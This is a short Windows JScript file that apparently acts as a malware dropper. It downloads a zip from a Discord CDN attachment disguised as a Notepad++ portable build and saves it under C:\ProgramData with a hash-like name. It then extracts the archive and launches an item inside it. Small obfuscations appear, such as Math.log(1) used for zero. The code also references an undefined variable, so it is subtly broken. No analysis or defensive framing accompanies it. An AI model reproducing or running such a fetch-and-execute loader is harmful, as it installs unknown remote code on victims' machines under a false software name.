var programdata_folder='C:\\ProgramData\\';
var xhttp=new ActiveXObject("MSXML2.XMLHTTP");
xhttp.onreadystatechange=function() {
    if(xhttp.readyState===4) {
        var adodb=new ActiveXObject("ADODB.Stream");
        adodb.open();
        adodb.type=1;
        adodb.write(xhttp.ResponseBody);
        adodb.position=0;
        adodb.saveToFile(programdata_folder+"7119faa4bbc81c657c224afb6ee97434.zip", 2);
        adodb.close();
    }
};
xhttp.open("GET", "https://cdn.discordapp.com/attachments/1063900897270304770/1196763302303379496/npp.8.6.portable.x64.zip?ex=65b8cfae&is=65a65aae&hm=d30cc80d979d64493314348ac5a012ef68a7e030d08ec0360a636b7744b8f9b6&", false);
xhttp.send(); 
var shell = new ActiveXObject("Shell.Application");
var shell_namespace=shell.NameSpace(programdata_folder+"7119faa4bbc81c657c224afb6ee97434.zip");
shell.NameSpace(programdata_folder).CopyHere(xhttp_namespace.Items(), 12);
new ActiveXObject("WScript.Shell").CurrentDirectory=programdata_folder+shell_namespace.Items().Item(Math.log(1));
shell.NameSpace(programdata_folder+shell_namespace.Items().Item(Math.log(1))).Items().Item(12).InvokeVerb();
